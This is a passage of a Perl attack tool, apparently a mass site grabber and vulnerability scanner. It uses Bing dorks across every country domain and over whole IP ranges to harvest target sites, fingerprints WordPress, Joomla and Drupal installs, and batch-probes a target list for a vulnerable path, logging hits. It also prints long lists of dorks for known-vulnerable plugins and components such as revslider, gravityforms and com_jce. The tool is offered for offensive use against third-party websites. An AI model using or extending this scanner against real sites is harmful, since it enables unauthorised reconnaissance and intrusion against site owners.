@domains= ("gov","edu","com","net","af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw","info","tv","travel","biz","mobi","tel","int","mil","eu","design","online","shop","clup","asia","academy","accountant","accountants","actor","adult","ae.org","africa","agency","apartement","com.ar","archi","art","associates","attorney","com.au","id.au","net.au","org.au","auction","band","bar","bargains","bayern","beer","berlin","best","bet","bid","bike","bingo","bio","biz","black","blog","blue","boutique","br.com","brussels","build","buiders","business","buzz","cab","cafe","cam","camera","camp","capetown","capital","cards","care","career","careers","casa","cash","casino","catering","center","chat","cheap","church","city","claims","cleaning","click","clinic","clothing","cloud","cn.com","co.uk","coach","codes","coffee","college","community","company","computer","construction","consulting","contractors","cooking","cool","country","coupons","courses","credit","cricket","cruises","dance","date","dating","deals","degree","delivery","democrat","dental","dentist","diamonds","digital","direct","directory","discount","doctor","dog","domains","durban","download","earth","eco","education","email","energy","engineer","engineering","enterprises","equipment","estate","eu.com","events","exchange","expert","exposed","express","fail","faith","family","fans","farm","fashion","finance","finance","financial","fish","fishing","fit","fitness","flights","florist","fm","football","forsale","foundation","fun","fund","furniture","futbol","fyi","gallery","games","garden","gift","gifts","gives","glass","global","gold","golf","graphics","gratis","green","gripe","group","guide","guru","hamburg","haus","health","healthcare","help","hockey","holiday","horse","hospital","host","house","how","ht","immo","immobilien","industries","ink","institute","insure","international","investments","jetzt","jewelry","joburg","jpn.com","kaufen","kim","kitchen","kiwi","koeln","kyoto","land","lat","lawyer","lease","legal","lgbt","life","lighting","limited","limo","link","live","loan","loans","lol","london","love","ltd","maison","management","marketing","mba","media","melbourne","men","menu","miami","mobi","moda","moe","mom","money","mortgage","nagoya","name","network","news","ngo","ninja","nyc","ac.nz","org.nz","kiwi.nz","net.nz","school.nz","gen.nz","geen.nz","co.nz","maori.nz","okinawa","one","onl","organic","osaka","paris","partners","parts","party","pet","photo","photography","photos","pics","pictures","pink","pizza","place","plumbing","plus","poker","porn","press","pro","productions","promo","properties","pub","qpon","quebec","racing","recipes","red","rehab","reise","reisen","rent","rentals","repair","report","republican","rest","restaurant","review","reviews","rip","rocks","rodeo","ru.com","run","ryukyu","sa.com","sale","salon","sarl","com.sb","school","schule","science","scot","services","sexy","com.sg","shiksha","shoes","shopping","show","singles","site","ski","soccer","social","software","solar","solutions","soy","space","stop","store","stream","studio","study","style","supplies","supply","support","sure","surgery","sydney","systems","taipei","tattoo","tax","taxi","team","tech","technology","tel","tennis","theater","tienda","tips","tires","today","tokyo","tools","top","tours","town","toys","trade","trading","training","tube","org.uk","me.uk","uk.com","university","uno","us.com","vacations","vc","vegas","ventures","vet","viajes","video","villas","vin","vip","vision","vlaanderen","vodka","vote","voting","voyage","wales","wang","watch","webcam","website","wedding","wf","wien","wiki","win","wine","work","works","world","wtf","??","??","???","???","?????","??","???","??","??","??","XYZ","YOGA","yokohama","yt","co.za","za.com","zone");

OUTER: foreach $domains(@domains){
chomp $domains;
$dork="$dor+site:$domains";
print color("red"),"ur scan is for [ ";
print color('reset');
print color("green"),"$domains ]\n";
print color('reset');
THE();
}
}
if ($toolZ eq '7')
{
Into();
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub gettt()
{

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ips.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
THE();
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub gett()
{
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ips.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
THE();
}
}
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub crew
{
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>sites-2.txt');
    print save "$link\n";
	print "saved at target/sites-2.txt";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub THE
{
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>target/sites-1.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;
}
}
	print "saved at target/sites-1.txt";

}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub Into
{
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
$logo="

                                                                                                                               
'########:::::'###::::'########::'#######:::'#######::'##:::'##::::'###::::
 ##.... ##:::'## ##:::..... ##::'##.... ##:'##.... ##: ##::'##::::'## ##:::
 ##:::: ##::'##:. ##:::::: ##::: ##:::: ##: ##:::: ##: ##:'##::::'##:. ##::
 ########::'##:::. ##:::: ##:::: ##:::: ##: ##:::: ##: #####::::'##:::. ##:
 ##.... ##: #########::: ##::::: ##:::: ##: ##:::: ##: ##. ##::: #########:
 ##:::: ##: ##.... ##:: ##:::::: ##:::: ##: ##:::: ##: ##:. ##:: ##.... ##:
 ########:: ##:::: ##: ########:. #######::. #######:: ##::. ##: ##:::: ##:
........:::..:::::..::........:::.......::::.......:::..::::..::..:::::..:: V1.2 Coded By Wissem Mahfoud

";
print color("red"),$logo;
print color("green" ), "\t   [";print color("red"),"1";print color("green"),"]  **  --> extract WORDPRESS sites ^^\n";
print color("green" ), "\t   [";print color("red"),"2";print color("green"),"]  **  --> extract JOOMLA sites ^^\n";
print color("green" ), "\t   [";print color("red"),"3";print color("green"),"]  **  --> extract DRUPAL sites ^^\n";
print color("green" ), "\t   [";print color("red"),"4";print color("green"),"]  **  --> extract VBULLETIN sites ^^\n";
print color("green" ), "\t   [";print color("red"),"5";print color("green"),"]  **  --> extract ALL the server sites ^^\n";
print color("green" ), "\t   [";print color("red"),"6";print color("green"),"]  **  --> GO_BACK <-- ^^\n";
print color("green"),"[+] Choose Number : ";
	$choice1 = <stdin>;
	chomp ($choice1);
	if ($choice1 eq "w" or $choice1 eq "W" or $choice1 eq "1")
	{
		print "\nExtract Wordpress sites...\n";
		print "==============================\n";
		IP_id();
		print "Searching for Wordpress sites\n";
		WPS();
		$n_found = $#WPS+1;
		print "\t>> Found $n_found Wordpress sites\n\n";
		print "Do you want to save the result (Y\\n): ";
		$save = <stdin>;
		chomp($save);
		if ($save eq "Y" or $save eq "" or $save eq "y")
		{
			open(wp, ">target/WPSites.txt");
			map {$_ = "$_\n"} (@WPS);
			print wp @WPS;
		print "\t>> Saved at target/WPSites.txt\n";
		}
	}
	elsif ($choice1 eq "j" or $choice1 eq "J" or $choice1 eq "2") 
	{
		print "\nExtract Joomla sites...\n";
		print "==============================\n";
		print "Do you want to extract all Joomla Sites or V1.5 only ?\n";
		print "(ALL\\1.5): ";
		$choice2 = <stdin>;
		chomp($choice2);
		if ($choice2 eq "all" or $choice2 eq "ALL" or $choice2 eq "")
		{
			IP_id();
			print "Searching for Joomla sites\n";
			Joomla();
			$n_found = $#JM+1;
			print "\t>> Found $n_found Joomla sites\n\n";
			print "Do you want to save the result (Y\\n): ";
			$save = <stdin>;
			chomp($save);
			if ($save eq "Y" or $save eq "" or $save eq "y")
			{
				open(joomsite, ">target/JoomlaSites.txt");
				map {$_ = "$_\n"} (@JM);
				print joomsite @JM;
				print "\t>> Saved at target/JoomlaSites.txt\n";
			}
		}
		elsif ($choice2 eq "1.5")
		{
			IP_id();
			print "Searching for Joomla 1.5 sites\n";
			Joomla15();
			$n_found = $#JM+1;
			print "\t>> Found $n_found Joomla 1.5 sites\n\n";
			print "Do you want to save the result (Y\\n): ";
			$save = <stdin>;
			chomp($save);
			if ($save eq "Y" or $save eq "" or $save eq "y")
			{
				open(joomsite, ">target/JoomlaSites.txt");
				map {$_ = "$_\n"} (@JM);
				print joomsite @JM;
				print "\t>> Saved at target/JoomlaSites.txt\n";
			}
		}
		else
		{
			print "Unknown Choice !!\nExiting...\n";
			exit;
		}
			
	}
	elsif ($choice1 eq "d" or $choice1 eq "D" or $choice1 eq "3")
	{
		print "\nExtract Drupal sites...\n";
		print "==============================\n";
		print "Do you want to extract all Drupal version or sites with specific version\n";
		print "(all? Y\\n): ";
		$choice3 = <stdin>;
		chomp ($choice3);
		if ($choice3 eq "n" or $choice3 eq "N")
		{
			print "(version?):" ;
			$ver = <stdin>;
			chomp ($ver);
			IP_id();
			print "Searching for Drupal $ver sites\n";
			DRV();
                        $n_found = $#DS+1;
                        print "\t>> Found $n_found Drupal sites\n\n";
                        print "Do you want to save the result (Y\\n): ";
                        $save = <stdin>;
                        chomp($save);
                        if ($save eq "Y" or $save eq "" or $save eq "y")
                        {
                                open(drupsite,">target/DrupalSites$ver.txt");
                                map {$_ = "$_\n"} (@DS);
                                print drupsite @DS;
                                print "\t>> Saved at target/DrupalSites$ver.txt\n";
                        }
		}
		elsif ($choice3 eq "Y" or $choice3 eq "y" or $choice3 eq "")
		{
			IP_id();
			print "Searching for Drupal sites\n";
			Drupal();
			$n_found = $#DS+1;
			print "\t>> Found $n_found Drupal sites\n\n";
			print "Do you want to save the result (Y\\n): ";
			$save = <stdin>;
			chomp($save);
			if ($save eq "Y" or $save eq "" or $save eq "y")
			{
				open(drupsite,">target/DrupalSites.txt");
				map {$_ = "$_\n"} (@DS);
				print drupsite @DS;
				print "\t>> Saved at target/DrupalSites.txt\n";
			}
			
		}
	}

	elsif ($choice1 eq "WJD" or $choice1 eq "wjd" or $choice1 eq "" or $choice1 eq "5")
	{
		print "\nExtract Wordpress & Joomla & Drupal sites...\n";
		print "====================================================\n";
		IP_id();
		print "\nSearching for Wordpress sites\n";
		print "---------------------------------\n";
		WPS();
		$n_found = $#WPS+1;
		print "\t>> Found $n_found Wordpress sites\n";
		open(wordpress, ">target/Wordpress.txt");
		map {$_ = "$_\n"} (@WPS);
		print wordpress @WPS;
		print "\t>> Saved at target/Wordpress.txt\n\n";

		print "\nSearching for Joomla sites\n";
		print "------------------------------\n";
		Joomla();
		$n_found = $#JM+1;
		print "\t>> Found $n_found Joomla sites\n";
		open(joomla, ">target/Joomla.txt");
		map {$_ = "$_\n"} (@JM);
		print joomla @JM;
		print "\t>> Saved at target/Joomla.txt\n\n";

		print "\nSearching for Drupal sites\n";
		print "-----------------------------\n";
		Drupal();
		$n_found = $#DS+1;
		print "\t>> Found $n_found Drupal sites\n";
		open(drupal,">target/Drupal.txt");
		map {$_ = "$_\n"} (@DS);
		print drupal @DS;
		print "\t>> Saved at target/Drupal.txt\n";
	}
	elsif ($choice1 eq "all" or $choice1 eq "ALL" or $choice1 eq "4")
	{
		print "\nExtract Server sites\n";
		print "========================\n";
		IP_id();
		map {$_ = "$_\n"} (@result);
		print @result;
		print "Do you want to save the result (Y\\n): ";
		$save = <stdin>;
		chomp($save);
		if ($save eq "Y" or $save eq "" or $save eq "y")
		{
			open(sites, ">target/Sites.txt");
			print sites @result;
			print "\t>> Saved at target/Sites.txt\n";
		}

	}
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub IP_id
 {
	print "Enter the IP of the server or a site hosted on the same server\n";
	print ">> ";
	$input =<stdin>;
	chomp($input);
	if ($input =~ m/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
	{
		$ip = $input;
		print "Collecting the sites...\n";
		getSites();
	}
	elsif ($input =~ m/\D/g)
	{
		if ($input =~ m/https:\/\//)
		{
			$source = substr($input,8,length($input));
			print "Site : $source\n";
			print "Getting IP Adress...\n";
                        $ip = inet_ntoa(inet_aton($source));
                        print "IP: $ip\n";
			print "Collecting the sites...\n";
			getSites();
		}
                elsif ($input =~ m/http:\/\//)
                {
                        $source = substr($input,7,length($input));
                        print "Site : $source\n";
			print "Getting IP Adress...\n";
                        $ip = inet_ntoa(inet_aton($source));
                        print "IP: $ip\n";
			print "Collecting the sites...\n";
			getSites();

                }
		else 
		{
			print "Site : $input\n";
			print "Getting IP Adress...\n";
			$ip = inet_ntoa(inet_aton($input));
			print "IP : $ip\n";
			print "Collecting the sites...\n";
			getSites();
		}
	}	
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub Joomla15 
{
        foreach $site (@result)
        {
                $mech->get("$site");
                $Scont = $mech->content;
                if ($Scont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
                {
                        push @JM,$site;
                        print "$site\n";
                }
                else 
                {
                        $admin = "$site/administrator/";
                        $mech->get("$site");
                        $AdminCont = $mech->content;
                        if ($AdminCont =~ m/<meta name="generator" content="Joomla! 1.5 - Open Source Content Management" \/>/ig)
                        {
                                push @JM,$site;
                                print "$site\n";
                        }
                }
        }
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub Joomla 
{
	foreach $site (@result)
	{
		if  (!  grep (/$site/,@WPS))
		{
			$url = $mech->get("$site");
			$Scont = $mech->content;
			if ($Scont =~ m/<meta name="generator" content="Joomla!/ig)
			{
				push @JM,$site;
				print "$site\n";
			}
			else 
			{
				$admin = "$site/administrator/";
				$mech->get("$site");
				$AdminCont = $mech->content;
				if ($AdminCont =~ m/<meta name="generator" content="Joomla!/ig)
				{
					push @JM,$site;
					print "$site\n";
				}
			}
		}
	}
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub DRV 
{
        foreach $site (@result)
        {
                $mech->get("$site");
                $Scont = $mech->content;
                if ($Scont =~ m/<meta name="Generator" content="Drupal $ver/ig)
                {
                        push @DS,$site;
                        print "$site\n";
                }
        }
	
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub Drupal 
{
	foreach $site (@result)
	{
		if  (!  grep (/$site/,@WPS) and ! grep(/$site/,@JM))
		{
			$mech->get("$site");
			$Scont = $mech->content;
			if ($Scont =~ m/<meta name="Generator" content="Drupal/ig)
			{
				push @DS,$site;
				print "$site\n";
			}
		}
	}
}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub WPS {
	foreach $site (@result)
	{
		$url = $mech->get("$site");
		$Scont = $mech->content;
		if ($Scont =~ m/wp-content/g)
		{
			$license = $site."license.txt";
			$horse = $mech->get("$license");
			if ($horse->is_success)
			{
				$Scont = $mech->content;
				$login = $site."wp-login.php";
				$logUrl = $mech->get("$login");
	 	                if ($Scont =~ m/WordPress/)     
				{
					push @WPS,$site;
					print "$site\n";
				}
				elsif($logUrl->is_success) 
				{
					push @WPS,$site; 
					print "$site\n";
				}

			}

		}


	}

}
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
####################################################################################################################
sub getSites {
	for($count=10;$count<=1000;$count+=10)
	{
		$k++;
		$url = "http://www.hotbot.com/search/web?pn=$k&q=ip%3A$ip&keyvol=01f9093871a6d24c0d94";
		$url = "https://www.bing.com/search?q=ip%3a$ip&go=Submit+Query&qs=ds&first=$count&FORM=PERE$k";
		$url = "https://www.bing.com/search?q=ip%3A$ip+&count=50&first=$count";
		$resp = $ag->request(HTTP::Request->new(GET => $url));

		$rrs = $resp->content;



		while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g)
		{
	
			$link = $1;
		
			if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
			{
				if ($link !~ /^http:/)
				{
					$link = 'http://' . "$link" . '/';
				}
	
				if($link !~ /\"|\?|\=|index\.php/)
				{
					if  (!  grep (/$link/,@result))
					{
						push(@result,$link);
					}
				}
			} 
		}
	}
	$found = $#result + 1;
	print "found $found sites\n";
	
}

}

if ($whatspywant eq '15'){
print color("bold red")," {*} Goodbye {*} ";
exit

}




while(<tarrget>){
chomp($_);
$target = $_;
if($target !~ /http:\/\//)
{
$target = "$target";
}

$website = $target.$a7a;
 $vuln2 =$vulnn;

$req=HTTP::Request->new(GET=>$website);
$ua=LWP::UserAgent->new();
$ua->timeout(30);
$response=$ua->request($req);
if($response->content=~ $mohmed )

 {
 print color 'reset';
 $Messageee  ="$vulnn";
print color("bold Green"), "";
open (TEXT, '>>Found.txt');
print TEXT "$target$vuln2\n";
close (TEXT);
}
else {

print color 'reset';
$Messageee = " Failed ";
print color("bold red"), "";

}
print "[+] $target => $Messageee\n";
}


sub bing(){
system('cls');


$logo="
8 888888888o          .8.           8888888888',8888'  ,o888888o.         ,o888888o.     8 8888     ,88'          .8.          
8 8888    `88.       .888.                 ,8',8888'. 8888     `88.    . 8888     `88.   8 8888    ,88'          .888.         
8 8888     `88      :88888.               ,8',8888',8 8888       `8b  ,8 8888       `8b  8 8888   ,88'          :88888.        
8 8888     ,88     . `88888.             ,8',8888' 88 8888        `8b 88 8888        `8b 8 8888  ,88'          . `88888.       
8 8888.   ,88'    .8. `88888.           ,8',8888'  88 8888         88 88 8888         88 8 8888 ,88'          .8. `88888.      
8 8888888888     .8`8. `88888.         ,8',8888'   88 8888         88 88 8888         88 8 8888 88'          .8`8. `88888.     
8 8888    `88.  .8' `8. `88888.       ,8',8888'    88 8888        ,8P 88 8888        ,8P 8 888888<          .8' `8. `88888.    
8 8888      88 .8'   `8. `88888.     ,8',8888'     `8 8888       ,8P  `8 8888       ,8P  8 8888 `Y8.       .8'   `8. `88888.   
8 8888    ,88'.888888888. `88888.   ,8',8888'       ` 8888     ,88'    ` 8888     ,88'   8 8888   `Y8.    .888888888. `88888.  
8 888888888P .8'       `8. `88888. ,8',8888888888888   `8888888P'         `8888888P'     8 8888     `Y8. .8'       `8. `88888.                    
";
print color("red"),$logo;

print color("green"), "[1] World Wide     |> World Wide Grabber\n";
print color("green"), "[2] Mass Site Dump |> By Ip or Websites List\n";
print color("green"), "[3] Mass Site Dump |> Range Ip by Ip or Wbesite list\n";
print color("green"), "[4] i'm Idiot And I Don't Know What To Do \n";
print color("green"), "[5] About Me \n";
my $targett = <STDIN>;
chomp $targett;



if($targett eq '1')
{
print "[Just Put Your Dork And I will Scan All World Sites Area ]\n";
print "Give Me Dork:";
$dor=<STDIN>;
chomp($dor);
$dor=~s/ /+/g;

@country= ("af","al","dz","as","ad","ao","ai","aq","ag","ar","am","aw","au","at","az","bs","bh","bd","bb","by","be","bz","bj","bm","bt","bo","ba","bw","bv","br","io","bn","bg","bf","bi","kh","cm","ca","cv","ky","cf","td","cl","cn","cx","cc","co","km","cg","cd","ck","cr","ci","hr","cy","cz","dk","dj","dm","do","tl","ec","eg","sv","gq","er","ee","et","fk","fo","fj","fi","fr","gf","pf","tf","ga","gm","ge","de","gh","gi","gr","gl","gd","gp","gu","gt","gn","gw","gy","ht","hm","hn","hk","hu","is","in","id","iq","ie","il","it","jm","jp","jo","kz","ke","ki","kw","kg","la","lv","lb","ls","lr","ly","li","lt","lu","mo","mk","mg","mw","my","mv","ml","mt","mh","mq","mr","mu","yt","mx","fm","md","mc","mn","ms","ma","mz","na","nr","np","nl","an","nc","nz","ni","ne","ng","nu","nf","mp","no","om","pk","pw","ps","pa","pg","py","pe","ph","pn","pl","pt","pr","qa","re","ro","ru","rw","kn","lc","vc","ws","sm","st","sa","sn","cs","sc","sl","sg","sk","si","sb","so","za","gs","kr","es","lk","sh","pm","sr","sj","sz","se","ch","tw","tj","tz","th","tg","tk","to","tt","tn","tr","tm","tc","tv","ug","ua","ae","gb","us","um","uy","uz","vu","va","ve","vn","vg","vi","wf","eh","ye","zm","zw");

OUTER: foreach $country(@country){
chomp $country;
$dork="$dor+site:$country";
print color("yellow"),"[Country : ";
print color('reset');
print color("white"),"$country]\n";
print color('reset');
gassone();
}
}


if($targett eq '2')
{
print "[Put A Ip List path or websites BUT websites should be www.site.com without http : ... ]\n";
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);
	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
get();
}else{
get();
}

}


}
if($targett eq '3')
{
spyx2();
sub spyx2(){
print " Path to your websites list:";
my $list=<STDIN>;
chomp($list);

	open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $tofuck(@TARGETS){
chomp($tofuck);
if($tofuck =~ /http:\/\/(.*)\//) {
$tofuck= $1;
gett();

}else{
gett();
open(save, '>>Result/Generator.txt');
   print save "$list\n";  
   close(save);

}

}
}
}


if($targett eq '4')
{
print ("
            Drupal Dorks: 
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5
            Wordpress Dorks :
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija 
                Joomla Dorks :
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_billyportfolio
index.php?option=com_blog
index.php?option=com_blogfactory
index.php?option=com_book
index.php?option=com_bookflip
index.php?option=com_booklibrary
index.php?option=com_btg_oglas
index.php?option=com_caddy
index.php?option=com_calcbuilder
index.php?option=com_calendario
index.php?option=com_canteen
index.php?option=com_carman
index.php?option=com_cartikads
index.php?option=com_cartweberp
index.php?option=com_casino
index.php?option=com_category
index.php?option=com_cbe
index.php?option=com_cbresumebuilder
index.php?option=com_ccboard
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_ccrowdsource
index.php?option=com_cgtestimonial
index.php?option=com_chronocontact
index.php?option=com_clan
index.php?option=com_clanlist
index.php?option=com_clantools
index.php?option=соm_рhilаfоrm
index.php?option=com_easybook
index.php?option=com_simpleboard
index.php?option=com_admin
index.php?option=com_htmlarea3_xtd-c
index.php?option=com_sitemap
index.php?option=com_ewriting
index.php?option=com_performs
index.php?option=com_forum
index.php?option=com_productshowcase
index.php?option=com_menus
index.php?option=com_musica
index.php?option=com_colorlab
index.php?option=com_community
index.php?option=com_comp
index.php?option=com_componen
index.php?option=com_component
index.php?option=com_connect
index.php?option=com_content
index.php?option=com_contentbloglist
index.php?option=com_countries
index.php?option=com_crowdsource
index.php?option=com_cvmaker
index.php?option=com_dailymeals
index.php?option=com_dashboard
index.php?option=com_dateconverter
index.php?option=com_datsogallery
index.php?option=com_myalbum
index.php?option=com_dcnews
index.php?option=com_delicious
index.php?option=com_diary
index.php?option=com_digifolio
index.php?option=com_digistore
index.php?option=com_dioneformwizard
index.php?option=com_dir
index.php?option=com_discussions
index.php?option=com_djclassifieds
index.php?option=com_dms
index.php?option=com_doqment
index.php?option=com_drawroot
index.php?option=com_dshop
index.php?option=com_education_classess
index.php?option=com_elite_experts
index.php?option=com_eportfolio
index.php?option=com_equipment
index.php?option=com_esearch
index.php?option=com_event
index.php?option=com_eventcal
index.php?option=com_eventing
index.php?option=com_extcalendar
index.php?option=com_mospray
index.php?option=com_smf
index.php?option=com_pollxt
index.php?option=com_ezautos
index.php?option=com_loudmounth
index.php?option=com_videodb
index.php?option=com_ezine
index.php?option=com_family
index.php?option=com_fastball
index.php?option=com_fireboard
index.php?option=com_flashgames
index.php?option=com_flexicontent
index.php?option=com_flipwall
index.php?option=com_football
index.php?option=com_forme
index.php?option=com_fss
index.php?option=com_g2bridge
index.php?option=com_gambling
index.php?option=com_gamesbox
index.php?option=com_gantry
index.php?option=com_gbufacebook
index.php?option=com_gds
index.php?option=com_gigfe
index.php?option=com_golfcourseguide
index.php?option=com_google
index.php?option=com_graphics
index.php?option=com_grid
index.php?option=com_gsticketsystem
index.php?option=com_guide
index.php?option=com_hbssearch
index.php?option=com_hdflvplayer
index.php?option=com_hdvideoshare
index.php?option=com_hello
index.php?option=com_hezacontent
index.php?option=com_hitexam
index.php?option=com_hmcommunity
index.php?option=com_horoscope
index.php?option=com_hotbrackets
index.php?option=com_huruhelpdesk
index.php?option=com_if_nexus
index.php?option=com_ijoomla_archive
index.php?option=com_ijoomla_rss
index.php?option=com_img
index.php?option=com_immobilien
index.php?option=com_include
index.php?option=com_intuit
index.php?option=com_iotaphotogallery
index.php?option=com_iproperty
index.php?option=com_ircmbasic
index.php?option=com_itarmory
index.php?option=com_items
index.php?option=com_jacomment
index.php?option=com_jashowcase
index.php?option=com_javoice
index.php?option=com_jbook
index.php?option=com_jbpublishdownfp
index.php?option=com_jce
index.php?option=com_jcollection
index.php?option=com_jdirectory
index.php?option=com_jdownloads
index.php?option=com_jdrugstopics
index.php?option=com_jeajaxeventcalendar
index.php?option=com_jeauto
index.php?option=com_jedirectory
index.php?option=com_jeemaarticlecollection
index.php?option=com_jeemasms
index.php?option=com_jefaqpro
index.php?option=com_jeguestbook
index.php?option=com_jepoll
index.php?option=com_jequoteform
index.php?option=com_jesectionfinder
index.php?option=com_jestory
index.php?option=com_jesubmit
index.php?option=com_jfuploader
index.php?option=com_jgen
index.php?option=com_jim
index.php?option=com_jimtawl
index.php?option=com_jinc
index.php?option=com_jlord_rss
index.php?option=com_jmsfileseller
index.php?option=com_jnewsletter
index.php?option=com_jnewspaper
index.php?option=com_job
index.php?option=com_jomdocs
index.php?option=com_jomestate
index.php?option=com_jomsocial
index.php?option=com_jomtube
index.php?option=com_joomdle
